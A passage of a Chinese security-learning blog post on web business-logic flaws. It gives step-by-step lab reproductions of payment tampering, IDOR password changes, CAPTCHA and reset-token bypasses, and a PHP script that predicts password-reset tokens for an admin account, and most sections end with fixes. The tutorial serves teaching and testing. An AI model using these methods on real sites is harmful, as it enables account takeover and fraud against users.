id="6、社交"><a href="#6、社交" class="headerlink" title="6、社交"></a>6、社交</h2><ol><li>强行举报（读取本地消息上传那种）</li><li>强行加好友（一般尝试重发通过好友这条协议）</li><li>自由修改号码（靓号类）</li><li>群管理无限禁言</li><li>越权禁言，踢人，拉黑</li><li>会员修改金额，数量。无限优惠购买。</li><li>非会员使用会员功能。</li></ol><h2 id="7、漫画"><a href="#7、漫画" class="headerlink" title="7、漫画"></a>7、漫画</h2><ol><li>打赏金额为负数，小数，特定值（溢出）</li><li>越权删除评论，登陆</li><li>修改充值金额</li><li>付费漫画免费看</li><li>评论图片数量过多会导致客户端加载卡死</li></ol><h2 id="8、音乐"><a href="#8、音乐" class="headerlink" title="8、音乐"></a>8、音乐</h2><ol><li>唱歌类软件修改上传分数等参数</li><li>付费下载尝试替换下载ID</li><li>修改付费下载金额</li><li>F12查看下是否有歌曲地址</li></ol><h2 id="9、网约车"><a href="#9、网约车" class="headerlink" title="9、网约车"></a>9、网约车</h2><ol><li>无限叫车，重复发送协议造成市场混乱</li><li>修改评价分数</li><li>修改现实优惠叫车关键参数</li><li>替换优惠券</li><li>越权操作其他订单</li></ol><h1 id="四、根据漏洞出现位置来总结"><a href="#四、根据漏洞出现位置来总结" class="headerlink" title="四、根据漏洞出现位置来总结"></a>四、根据漏洞出现位置来总结</h1><p><img src="http://120.48.107.243:9090/blog/2023/04/01/2dbb87f47ca14cf5a001f5047994932a.png" alt="在这里插入图片描述"></p><h1 id="五、如何挖掘"><a href="#五、如何挖掘" class="headerlink" title="五、如何挖掘"></a>五、如何挖掘</h1><ol><li>确定业务流程</li><li>寻找流程中可以被操控的环节</li><li>分析可被操控环节中可能产生的逻辑问题</li><li>尝试修改参数触发逻辑问题</li></ol><h1 id="六、注册处存在的逻辑漏洞"><a href="#六、注册处存在的逻辑漏洞" class="headerlink" title="六、注册处存在的逻辑漏洞"></a>六、注册处存在的逻辑漏洞</h1><h2 id="1、ZZCMS8-1批量注册"><a href="#1、ZZCMS8-1批量注册" class="headerlink" title="1、ZZCMS8.1批量注册"></a>1、ZZCMS8.1批量注册</h2><p>在这里使用phpstudy搭建好了zzcms，注册填写相关信息，然后抓包。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/646a3249d97346d8a834dc8cd92ea0bb.png" alt="在这里插入图片描述"><br>将数据包发送到repeater，每次修改username值，发现，只需要修改username值就可以注册<br>成功⽤户，图形验证码⽆效，并且未对电话，邮箱等信息校验，可批量注册<br><img src="http://120.48.107.243:9090/blog/2023/04/01/9c7fa08ff55949ee95f6917bc208a0d8.png" alt="在这里插入图片描述"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/01/fec38b38e9624b0b87368d16864f6a18.png" alt="在这里插入图片描述"></p><h2 id="2、ZZCMS8-1批量猜解用户"><a href="#2、ZZCMS8-1批量猜解用户" class="headerlink" title="2、ZZCMS8.1批量猜解用户"></a>2、ZZCMS8.1批量猜解用户</h2><p>同样是注册功能，在输⼊⽤户名时，发现会提示⽤户名是否存在，猜测该位置可以猜测哪些⽤户注册过该⽹站</p><p><img src="http://120.48.107.243:9090/blog/2023/04/01/0614d0e4124a4752806337673b133eac.png" alt="在这里插入图片描述"><br>在这里可以抓包，会发现对用户名id进行判断，发送到监测器，可以批量探测已经注册过的用户。</p><h1 id="七、登录部分存在的逻辑漏洞"><a href="#七、登录部分存在的逻辑漏洞" class="headerlink" title="七、登录部分存在的逻辑漏洞"></a>七、登录部分存在的逻辑漏洞</h1><h2 id="1、暴力破解用户名或密码"><a href="#1、暴力破解用户名或密码" class="headerlink" title="1、暴力破解用户名或密码"></a>1、暴力破解用户名或密码</h2><p>暴力破解用户名密码的情况，一般出现在登录部分没有验证码机制，没有根据用户名限制失败次数，没有根据IP限制失败次数等情况下。<br>一般来说：</p><ol><li>直接拿密码字典爆破某一个用户名</li><li>拿固定的弱口令密码，去跑用户名</li><li>如果只是用户名限制失败次数，可以使用思路2的方法</li><li>在存在返回提示用户名错误或者密码错误的情况下，可以分别爆用户名和密码<br> 常见限制：有时候会发现用户名或者密码是密文加密，这是可能通过前端或者其他方式加密，对于简单的来说base64编码和md5签名是很好识破的，在爆破的时候可以选择encode和hash。</li></ol><h2 id="2、利用cookie-amp-session"><a href="#2、利用cookie-amp-session" class="headerlink" title="2、利用cookie&amp;session"></a>2、利用cookie&amp;session</h2><h3 id="（1）cookie的作用和介绍"><a href="#（1）cookie的作用和介绍" class="headerlink" title="（1）cookie的作用和介绍"></a>（1）cookie的作用和介绍</h3><p>1、可以在客户端上保存用户数据，起到简单的缓存和用户身份识别等作用<br>2、保存用户的登录状态，用户进行登录，成功登录后，服务器生成特定的cookie返回给客户端，客户端下次访问该域名下的任何页面，将该cookie的信息发送给服务器，服务器经过检验，来判断用户是否登录。<br>3、记录用户的行为</p><h3 id="（2）cookie分类"><a href="#（2）cookie分类" class="headerlink" title="（2）cookie分类"></a>（2）cookie分类</h3><p>&#x3D;&#x3D;cookie分为会话cookie和持久cookie。&#x3D;&#x3D;<br>会话cookie是指在不设定它的生命周期，浏览器的开启到关闭就是一次会话，当关闭浏览器时，会话cookie就会跟随浏览器而销毁。<br>持久cookie则是设定了它的生命周期，此时，cookie像商品一样，有个保质期，关闭浏览器后，它不会销毁，知到设定的过期时间。</p><h3 id="（3）cookie伪造"><a href="#（3）cookie伪造" class="headerlink" title="（3）cookie伪造"></a>（3）cookie伪造</h3><p>cookie伪造：通过修改cookie中的某个参数来实现登录其他用户。<br>测试方法：</p><ol><li>使用一个账号登录，找一个可以证明身份的页面，例如首页的欢迎XX或者是个人中心显示昵称的地方。</li><li>刷新该页面拦截请求，观察cookie中的字段和值，例如 userid&#x3D;xxx，修改cookie中的值，把xxx改成admin。</li><li>forword放行，页面显示admin信息，则存在此问题。<br>修复方法：对于客户端标识的用户信息，使用session会话认证方式，避免通过cookie去仿冒其他人的身份。</li></ol><h3 id="（4）cookie登录绕过漏洞"><a href="#（4）cookie登录绕过漏洞" class="headerlink" title="（4）cookie登录绕过漏洞"></a>（4）cookie登录绕过漏洞</h3><p>如果用户登录验证使用cookie身份验证会存在安全隐患，cookie信息是外部控制的，如果验证不严很容易被绕过。<br>模拟环境：cookie身份绕过。<br>&#x3D;&#x3D;cookie可以在浏览器提交的数据进行修改的。&#x3D;&#x3D;<br>绕过方法：用buspteuie修改username不等于空即可绕过。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/15ebff5309634cc7976094913c62f768.png" alt="在这里插入图片描述"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/01/e912cf402c1649869eeed1d434990c7d.png" alt="在这里插入图片描述"><br>修复方式：<br>1、使用cookie身份验证时，不要使用简单的验证，对外部输入的参数进行过滤。<br>2、尽量使用session安全认证，session是外部不可控的。</p><h3 id="（5）cookie和session的区别"><a href="#（5）cookie和session的区别" class="headerlink" title="（5）cookie和session的区别"></a>（5）cookie和session的区别</h3><p>cookie实际上是一小段文本信息，客户端请求服务器，绕过服务器需要记录该用户的状态，就使用response向客户端浏览器颁发一个cookie，客户端浏览器会把cookie保存起来，当浏览器再次请求该网站时，浏览器就会把请求地址和cookie一同给服务器，服务器检查该cookie，从而判断用户的状态，服务器还可以根据需要修改cookie的内容。<br>session是另一种记录客户状态的机制，不同的是cookie保存在客户端浏览器中，而session保存在服务器上，客户端浏览器访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上，这就是session，客户端浏览器再次访问时只需要从该session中查找该客户的状态就可以了。</p><h3 id="（6）session会话固定攻击"><a href="#（6）session会话固定攻击" class="headerlink" title="（6）session会话固定攻击"></a>（6）session会话固定攻击</h3><p>Session会话固定攻击：一种诱骗受害者使用攻击者指定的会话表示的攻击手段，利用了服务器的session不变的机制。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/c5ce2f09a2db4f6b9eee6da3362cbb0d.png" alt="在这里插入图片描述"><br>测试方法：</p><ul><li>Session会话注销测试<br> 用户注销或者退出应用时，利用登录时的Session是否能再次利用登录。</li><li>Session会话超时时间测试<br> 用户登录系统后，在固定时间没有与服务器任何交互操作，刷新页面，看是否需要重新登录账户。<br> 攻击者重置Session id的方法：通过xss，嗅探等方法取得用户的session，修改数据包。<br> 修复方法：<br> 每次登录成功之后重新生成session，session id闲置过久时，进行重置session id。</li></ul><h3 id="（7）Session身份绕过漏洞"><a href="#（7）Session身份绕过漏洞" class="headerlink" title="（7）Session身份绕过漏洞"></a>（7）Session身份绕过漏洞</h3><p>使用已经登录用户的session，修改用户名为任意用户，同样可以成功登录。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/2b1178f88fdd49de932fdf4aab68e836.png" alt="在这里插入图片描述"></p><p> 修复方法：不要把session放置网站目录，绕过需要就设置权限访问，除了本地其他用户禁止访问。</p><h1 id="八、支付时存在的逻辑漏洞"><a href="#八、支付时存在的逻辑漏洞" class="headerlink" title="八、支付时存在的逻辑漏洞"></a>八、支付时存在的逻辑漏洞</h1><h2 id="大米CMS支付逻辑漏洞复现"><a href="#大米CMS支付逻辑漏洞复现" class="headerlink" title="大米CMS支付逻辑漏洞复现"></a>大米CMS支付逻辑漏洞复现</h2><p>在产品展示中，商品大米测试产品价格6000元，网站存在支付逻辑漏洞，可以使用1毛钱购买6000元的大米测试产品。<br>开启抓包，点击加入购物车。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/0a58f51ae63740b1a9037c811905d36d.png" alt="在这里插入图片描述"><br>将price改为1，qty改为10，发送。（数量为10，价格为1）<br><img src="http://120.48.107.243:9090/blog/2023/04/01/9012be3061a248f682a096cc678ad206.png" alt="在这里插入图片描述"><br>在购物车即可看到已经被修改。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/1f4aa5685415444da882c70202fedbcc.png" alt="在这里插入图片描述"><br>除了上述修改商品数量的方法，支付时的逻辑漏洞还包含以下几种思路：<br>修改商品编号，条件竞争，金额修改，充值中放弃订单未生效。</p><h1 id="九、业务处理-越权漏洞"><a href="#九、业务处理-越权漏洞" class="headerlink" title="九、业务处理-越权漏洞"></a>九、业务处理-越权漏洞</h1><h2 id="1、越权访问漏洞概念简析"><a href="#1、越权访问漏洞概念简析" class="headerlink" title="1、越权访问漏洞概念简析"></a>1、越权访问漏洞概念简析</h2><h3 id="（1）授权与验证"><a href="#（1）授权与验证" class="headerlink" title="（1）授权与验证"></a>（1）授权与验证</h3><p>了解越权访问的概念，首先要了解授权和验证的概念，授权是指网站赋予特定人对网站特定资源的读写权限，而验证是网站用于检查操作者是否真的可以对特定资源进行读写。</p><h3 id="（2）未授权访问"><a href="#（2）未授权访问" class="headerlink" title="（2）未授权访问"></a>（2）未授权访问</h3><p>未授权访问是指用户在梦游通过认证授权的情况下，能够直接访问需要通过认证才能访问到的页面或文本信息。</p><h2 id="2、什么是越权漏洞"><a href="#2、什么是越权漏洞" class="headerlink" title="2、什么是越权漏洞"></a>2、什么是越权漏洞</h2><p>由于梦游对用户权限进行严格的判断，导致低权限的账号（比如普通用户）可以去完成高权限账号（比如超管）范围内的操作，如果能够成功操作，则称之为越权操作，越权漏洞形成的原因是后台使用了不合理的泉休闲校验规则导致的。</p><h2 id="3、越权漏洞的产生原因"><a href="#3、越权漏洞的产生原因" class="headerlink" title="3、越权漏洞的产生原因"></a>3、越权漏洞的产生原因</h2><p>开发人员在对数据进行操作时对客户端请求的数据过分相信，遗漏了对于客户端权限的仔细判定。</p><h2 id="4、越权漏洞常见位置"><a href="#4、越权漏洞常见位置" class="headerlink" title="4、越权漏洞常见位置"></a>4、越权漏洞常见位置</h2><p>1、修改、重置、找回其他账户密码<br>2、查看、修改其他账户未公开的信息，例如个人资料、文件、数据、程序等<br>3、与账户关联的权限操作</p><h2 id="5、越权访问漏洞的分类"><a href="#5、越权访问漏洞的分类" class="headerlink" title="5、越权访问漏洞的分类"></a>5、越权访问漏洞的分类</h2><p>越权漏洞主要分为水平越权和垂直越权两大类。</p><h3 id="（1）水平越权"><a href="#（1）水平越权" class="headerlink" title="（1）水平越权"></a>（1）水平越权</h3><p>同级别（权限）的用户或者同一个角色的不同用户之间，可以越权访问，修改或者删除的非法操作，如果出现此漏洞，你们将可能会造成大批量数据泄露，严重的甚至会造成用户信息被恶意篡改。</p><h3 id="（2）垂直越权"><a href="#（2）垂直越权" class="headerlink" title="（2）垂直越权"></a>（2）垂直越权</h3><p>指使用权限低的用户可以访问权限较高的用户。<br>危害：<br>向上越权：普通用户可以执行管理员权限， 比如发布文章，删除文章等。<br>向下越权：一个高级用户可以访问低级用户信息（暴露用户隐私）。</p><h3 id="6、水平越权：metinfoV40越权漏洞"><a href="#6、水平越权：metinfoV40越权漏洞" class="headerlink" title="6、水平越权：metinfoV40越权漏洞"></a>6、水平越权：metinfoV40越权漏洞</h3><p>在会员中心注册登录，登录后进入修改基本信息的页面，随便修改一个密码，点击提交信息的同时抓包。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/47b2b8c0cd014cf897874b89ecdf500f.png" alt="在这里插入图片描述"></p><p>抓包修改useid为管理员id。<br><img src="https://img-blog.csdnimg.cn/a5285044983649fd9a5193fc95288132.png" alt="在这里插入图片描述"></p><p>成功修改管理员账号密码为123456，尝试后台登录。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/ea2928246cdf401da33290026dcb21d6.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/01/bb934df29e714c2f979bb0c0e3831137.png" alt="在这里插入图片描述"></p><h2 id="7、垂直越权：CouchDB垂直权限绕过漏洞（CVE-2017-12635）"><a href="#7、垂直越权：CouchDB垂直权限绕过漏洞（CVE-2017-12635）" class="headerlink" title="7、垂直越权：CouchDB垂直权限绕过漏洞（CVE-2017-12635）"></a>7、垂直越权：CouchDB垂直权限绕过漏洞（CVE-2017-12635）</h2><h3 id="（1）漏洞描述"><a href="#（1）漏洞描述" class="headerlink" title="（1）漏洞描述"></a>（1）漏洞描述</h3><p>Apache CouchDB是⼀个开源数据库，专注于易⽤性和成为”完全拥抱web的数据库”。它是⼀个使⽤JSON作为存储格式，JavaScript作为查询语⾔，MapReduce和HTTP作为API的NoSQL数据库。应⽤⼴泛，如BBC⽤在其动态内容展示平台，Credit Suisse⽤在其内部的商品部⻔的市场框架，Meebo，⽤在其社交平台（web和应⽤程序）。<br> 在2017年11⽉15⽇，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是⼀个任意命令执⾏漏洞，我们可以通过config api修改couchdb的配置query_server，这个配置项在设计、执⾏view的时候将被运⾏。<br>影响版本： 小于1.7.0 以及 小于 2.1.1。<br>安装好环境。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/33911d7582e74599bcbf613ede155087.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/01/efbbfcd7433342599192c6152abdf0b2.png" alt="在这里插入图片描述"><img src="http://120.48.107.243:9090/blog/2023/04/01/4f3defa6d44a4c46ad57f9ebb23b53d6.png" alt="在这里插入图片描述"><br>刷新抓包，将包覆盖，发送，即可使用test 123456登录成功。</p><p><img src="http://120.48.107.243:9090/blog/2023/04/01/a340892d33b6455f8122cd96f6265278.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/01/0c8d7bac9ade428293683c8ec71cea46.png" alt="在这里插入图片描述"></p><h3 id="（2）后记"><a href="#（2）后记" class="headerlink" title="（2）后记"></a>（2）后记</h3><p>越权漏洞的产生归根究底，还是由于网站开发者和管理者授权意识的淡薄，授权的滥用，因此，授权应当遵守如下几条原则：</p><ol><li>使用最小权限原则对用户进行赋权，对待权限做一只铁公鸡。</li><li>使用合理（严格）的权限校验规则。</li><li>使用后台登录状态作为条件进行权限判断。</li></ol><h1 id="十、密码找回时存在的逻辑漏洞"><a href="#十、密码找回时存在的逻辑漏洞" class="headerlink" title="十、密码找回时存在的逻辑漏洞"></a>十、密码找回时存在的逻辑漏洞</h1><p><img src="http://120.48.107.243:9090/blog/2023/04/01/baeb8302f5a0478c9459661b2dac1f89.png" alt="在这里插入图片描述"></p><h2 id="1、邮箱弱token"><a href="#1、邮箱弱token" class="headerlink" title="1、邮箱弱token"></a>1、邮箱弱token</h2><h3 id="（1）Unix时间戳-md5"><a href="#（1）Unix时间戳-md5" class="headerlink" title="（1）Unix时间戳+md5"></a>（1）Unix时间戳+md5</h3><p>通过邮箱找回密码，正常流程去邮箱查看重置密码链接，发现链接处有一串md5加密字符串。<br>重置他人密码只需力量用他人邮箱发送重置密码右键，在短时间内对Unix时间戳进行暴力破解，即可获得重置密码的链接。</p><h3 id="（2）用户名"><a href="#（2）用户名" class="headerlink" title="（2）用户名"></a>（2）用户名</h3><p>重置密码链接直接使用用户名进行区别，改变用户名即可更改他人密码。</p><h3 id="（3）服务器时间"><a href="#（3）服务器时间" class="headerlink" title="（3）服务器时间"></a>（3）服务器时间</h3><p>利用两个账号同时点击找回密码，去邮箱查看找回密码的链接，发现两者随机token只差1-2，而且可以猜测出为服务器时间，所以可以用一个未知账号和一个已知账号同时点击找回密码，稍微遍历随机token，就可以构造出未知账号的没密码找回链接。</p><h2 id="2、生成可控token"><a href="#2、生成可控token" class="headerlink" title="2、生成可控token"></a>2、生成可控token</h2><p>例如当我们通过邮箱找回密码，正常流程下抓包查看提交验证码后返回的数据，有加密字符串，这个加密字符串和后面重新设置新密码URL链接中的加密字符串一样。<br>所以可以利用这个加密字符串实现新密码rul中的加密字符串可控。<br>根据上面提交验证码的抓包，修改user为其他用户，发送就可以返回其他用户的加密字符串。<br>接着重新返回到找回密码首页，利用其他用户找回，点下一步，到输入验证码处，直接修改URL链接，加入加密字符串，可以直接绕过验证码，重置密码。</p><h2 id="3、短信验证码找回密码"><a href="#3、短信验证码找回密码" class="headerlink" title="3、短信验证码找回密码"></a>3、短信验证码找回密码</h2><p>1、进入某网站，找到找回密码或密码重置的功能点，首先填写自己的手机号码进行密码找回。<br>2、收到验证码后填入验证码和新密码提交，这时候使用数据抓包工具进行抓包，将数据包中的账户属性修改为其他账号，然后就可以使用自己设置的密码登录其他账户。</p><h2 id="4、重新绑定用户手机"><a href="#4、重新绑定用户手机" class="headerlink" title="4、重新绑定用户手机"></a>4、重新绑定用户手机</h2><ol><li>首先注册一个某邮箱的测试账号，然后会跳转到一个手机绑定页面上。</li><li>注意此链接中有个参数为UID，将UID修改为其他人的邮箱账号，填入一个可控的手机号码，获取验证码，确定后这个目标有限已经被越权绑定了密保手机。</li><li>走正常的密码取回流程，发现这个邮箱多了一个通过手机找回密码的方式，这个手机号就是刚绑定的手机号码。</li><li>获取验证码并填入新密码，最终重置目标账户的密码。</li></ol><h2 id="5、重新绑定用户邮箱"><a href="#5、重新绑定用户邮箱" class="headerlink" title="5、重新绑定用户邮箱"></a>5、重新绑定用户邮箱</h2><ol><li>首先注册一个某网站的测试账号</li><li>连接尾部的一串数字时用户的ID，通过修改ID可以进入其他用户的页面，该页面提供了更改邮箱的功能，可以在此处将邮箱地址修改为自己测试的邮箱。</li><li>然后使用改邮箱进行密码找回。</li></ol><h2 id="6、密码找回漏洞"><a href="#6、密码找回漏洞" class="headerlink" title="6、密码找回漏洞"></a>6、密码找回漏洞</h2><h3 id="（1）模拟环境"><a href="#（1）模拟环境" class="headerlink" title="（1）模拟环境"></a>（1）模拟环境</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/01/d01734afe8b340549ef3fcf49b3d7d21.png" alt="在这里插入图片描述"></p><h3 id="（2）时间戳转换"><a href="#（2）时间戳转换" class="headerlink" title="（2）时间戳转换"></a>（2）时间戳转换</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/01/aebda62e25034acaa73b62546327f4af.png" alt="在这里插入图片描述"></p><h3 id="（3）md5（当前时间戳-用户名）生成token原理"><a href="#（3）md5（当前时间戳-用户名）生成token原理" class="headerlink" title="（3）md5（当前时间戳+用户名）生成token原理"></a>（3）md5（当前时间戳+用户名）生成token原理</h3><p>当前面条件都通过后就可以生成token，我们可以在提交key之前生成一分钟或者一个小时内的token值，用脚本去访问每一个链接。</p><h3 id="（4）使用代码生成一个小时的token"><a href="#（4）使用代码生成一个小时的token" class="headerlink" title="（4）使用代码生成一个小时的token"></a>（4）使用代码生成一个小时的token</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_pass</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$email</span></span>)</span>&#123;</span><br><span class="line"> <span class="variable">$token</span>=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>().<span class="variable">$username</span>.<span class="variable">$email</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="variable">$token</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;=<span class="number">3600</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line"> <span class="variable">$timex</span>= <span class="title function_ invoke__">create_pass</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;admin@admin.com&#x27;</span>);</span><br><span class="line"> <span class="title function_ invoke__">write_file</span>(<span class="variable">$timex</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$i</span>.<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"> <span class="title function_ invoke__">sleep</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_file</span>(<span class="params"><span class="variable">$c</span></span>)</span>&#123;</span><br><span class="line"> <span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;time.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>),<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="（5）运行脚本，同时网页也提交我们的信息，让数据库更新token值"><a href="#（5）运行脚本，同时网页也提交我们的信息，让数据库更新token值" class="headerlink" title="（5）运行脚本，同时网页也提交我们的信息，让数据库更新token值"></a>（5）运行脚本，同时网页也提交我们的信息，让数据库更新token值</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/01/b3d1623778e64f86ad865befbf809087.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/01/cade9a97fccf484c88643ac7a2f41f32.png" alt="在这里插入图片描述"></p><h3 id="（6）token-php（上面代码）运行会在当前目录创建一个time-txt文件保存预测的token值"><a href="#（6）token-php（上面代码）运行会在当前目录创建一个time-txt文件保存预测的token值" class="headerlink" title="（6）token.php（上面代码）运行会在当前目录创建一个time.txt文件保存预测的token值"></a>（6）token.php（上面代码）运行会在当前目录创建一个time.txt文件保存预测的token值</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/01/308c8ab81545449c9491eb23e54f818a.png" alt="在这里插入图片描述"></p><h3 id="（7）此时我们可以根据预测的token值，在网页进行提交测试，如果token值多，可以使用burp枚举"><a href="#（7）此时我们可以根据预测的token值，在网页进行提交测试，如果token值多，可以使用burp枚举" class="headerlink" title="（7）此时我们可以根据预测的token值，在网页进行提交测试，如果token值多，可以使用burp枚举"></a>（7）此时我们可以根据预测的token值，在网页进行提交测试，如果token值多，可以使用burp枚举</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/01/cff9ffc5afd649bcaee3d92b7038d266.png" alt="在这里插入图片描述"></p><h3 id="（8）修改成功"><a href="#（8）修改成功" class="headerlink" title="（8）修改成功"></a>（8）修改成功</h3><p>链接上面是c&#x3D;send&amp;token&#x3D;（获取到的）<br><img src="http://120.48.107.243:9090/blog/2023/04/01/b0f20edea13f40de824b3383844182b1.png" alt="在这里插入图片描述"></p><h3 id="（9）修复方法"><a href="#（9）修复方法" class="headerlink" title="（9）修复方法"></a>（9）修复方法</h3><ol><li>修改加密算法和加密内容，一定要是强加密，也要做到增加猜解难度或密文不可猜解。</li><li>用户身份验证一定要在后端实现</li><li>在最后一步修改密码的动作时，一定要校验账号是否通过了验证、短信与手机号是否对应、发送短信与已校验账号不要使用同一个session名称。</li></ol><h1 id="十一、验证码存在的逻辑漏洞"><a href="#十一、验证码存在的逻辑漏洞" class="headerlink" title="十一、验证码存在的逻辑漏洞"></a>十一、验证码存在的逻辑漏洞</h1><p><img src="http://120.48.107.243:9090/blog/2023/04/01/dc62ca637d5c4cf2bee2b4cca7f03dbb.png" alt="在这里插入图片描述"></p><h2 id="1、暴力破解"><a href="#1、暴力破解" class="headerlink" title="1、暴力破解"></a>1、暴力破解</h2><p>要了解常见验证码机制：</p><ol><li>有的验证码输入正确一次，在一定时间内不用再输入。</li><li>有的验证码输入正确一次，会在你session中设定一个值，告诉服务器你已经通过验证码验证了。</li><li>有的验证码因为逻辑问题只是一个摆设，正常的逻辑为先对比验证码是否正确，再检测账号密码是否有正确，反过来就成了摆设。</li></ol><h2 id="2、时间、次数突破"><a href="#2、时间、次数突破" class="headerlink" title="2、时间、次数突破"></a>2、时间、次数突破</h2><p>概念：重复提交携带验证码的数据包，查看返回包，判断次数。<br>测试方法：<br>填写正确登录信息和验证码→抓取提交数据包→重复提交该数据包→查看是否登录成功→登录成功则存在验证码重复使用问题。</p><h2 id="3、回显测试"><a href="#3、回显测试" class="headerlink" title="3、回显测试"></a>3、回显测试</h2><p>概念：验证码直接由客户端生成，在回显中显示，可以通过浏览器工具直接查看。<br>测试方法：<br>1、在源码中显示，源代码审计，搜索源码中有无验证码。<br>2、在cookie中显示，抓包时分析cookie中是否含有验证码。</p><h2 id="4、绕过验证码"><a href="#4、绕过验证码" class="headerlink" title="4、绕过验证码"></a>4、绕过验证码</h2><p>漏洞成因：<br>由于逻辑设计缺陷，可以绕过验证，比如直接删除cookie或验证码参数可绕过，当验证不通过清空session时，验证码参数值为空时绕过等。<br>测试方法：</p><ol><li>输入正确账户信息和错误验证码，登录时抓包</li><li>删除cookie</li><li>客户端登录成功</li></ol><h2 id="5、篡改手机号"><a href="#5、篡改手机号" class="headerlink" title="5、篡改手机号"></a>5、篡改手机号</h2><p>在需要手机号的短信验证处，抓包修改手机号，可能做到非本账号手机号获取能够编辑本账号的验证码。</p><h3 id="zzcms8-1任意密码重置"><a href="#zzcms8-1任意密码重置" class="headerlink" title="zzcms8.1任意密码重置"></a>zzcms8.1任意密码重置</h3><p>忘记密码功能，我们输入用户名正确后会进行短信验证码，通过手机验证码或者游戏验证码。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/48d9fd13340649d0b5b46df1406c156d.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/01/f6dfb756e83c4bbb89e406ba9cb25f34.png" alt="在这里插入图片描述"><br>要选择拦截此请求包的回应，可以抓到这个包。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/6a27ff9eb4f34c46b47c38b72249a7af.png" alt="在这里插入图片描述"><br>将no改为yes发送。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/c15108cf5dfa46ba855c6a011123b844.png" alt="在这里插入图片描述"><br>会直接跳到更新密码。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/3d5f863751cf43e5b64ac6fead1059ef.png" alt="在这里插入图片描述"></p><h1 id="十二、业务接口存在的逻辑漏洞"><a href="#十二、业务接口存在的逻辑漏洞" class="headerlink" title="十二、业务接口存在的逻辑漏洞"></a>十二、业务接口存在的逻辑漏洞</h1><p>随着网络的不断发展，一些网站为了实现某些功能，需要去调用一些第三方接口，比如三大运营商的短信业务接口、支付宝、微信等第三方支付接口，那么在调用过程中，如果未能做一些安全处理，你们就会容易发生一些业务接口调用上的安全漏洞，常见的业务接口调用漏洞如下：</p><h2 id="1、重放攻击"><a href="#1、重放攻击" class="headerlink" title="1、重放攻击"></a>1、重放攻击</h2><p>在短信、电话、邮件调用业务或生成业务数据环节中（短信验证码，电话验证码，邮件验证码，订单生成，评论提交等），对其业务环节进行调用（重放）测试，如果业务经过调用（重放）后被多次生成有效的业务或数据结果。<br>危害：</p><ul><li>短信轰炸</li><li>电话轰炸</li><li>邮箱轰炸</li><li>恶意用户注册</li><li>恶意上传</li><li>恶意评论</li></ul><h2 id="2、接口未授权访问"><a href="#2、接口未授权访问" class="headerlink" title="2、接口未授权访问"></a>2、接口未授权访问</h2><p>测试方法：<br>只要是登录后才可以返回相关信息的接口，在未登录状态下也可以返回，就是未授权访问，在一般的网站测试中，可以http history中选择网站的根目录地址，然后右键spider from here进行爬取相关的url，然后在target栏下的site map中利用mime type进行筛选，主要关注一下json、script、xml等这些类型，然后把rul贴到浏览器中看是否能访问来验证。<br>修复方法：<br>利用token校验的方式，在url中添加一个token参数，只有token验证通过才返回接口数据且token使用一次后失效，在接口被调用时，后端对会话状态进行验证，如果已经登录，便返回接口数据，如果没有登录，则返回自定义的错误信息。</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 漏洞学习 </category>
          
          <category> 业务逻辑漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 漏洞学习 </tag>
            
            <tag> 业务逻辑漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Yunzai-Bot插件中pip命令安装报错</title>
      <link href="/2022/09/13/yunzai_pip_error/"/>
      <url>/2022/09/13/yunzai_pip_error/</url>
      
